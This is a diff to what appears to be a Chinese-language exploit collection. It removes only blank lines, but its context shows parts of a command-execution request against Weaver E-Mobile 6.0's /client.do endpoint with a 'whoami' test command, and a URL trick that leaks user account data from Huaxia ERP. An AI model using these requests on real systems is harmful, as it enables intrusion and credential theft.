@@ -52,7 +52,6 @@ Testcmd: whoami
 ## 泛微E-Mobile 6.0 存在命令执行
 
 ```
-
 POST /client.do HTTP/1.1
 Host: {{Hostname}}
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
@@ -78,7 +77,6 @@ Content-Disposition: form-data; name="uploadID"
 ## 华夏erp账号密码泄露
 
 ```
-
 /jshERP-boot/user/getAllList;.ico
 ```
 
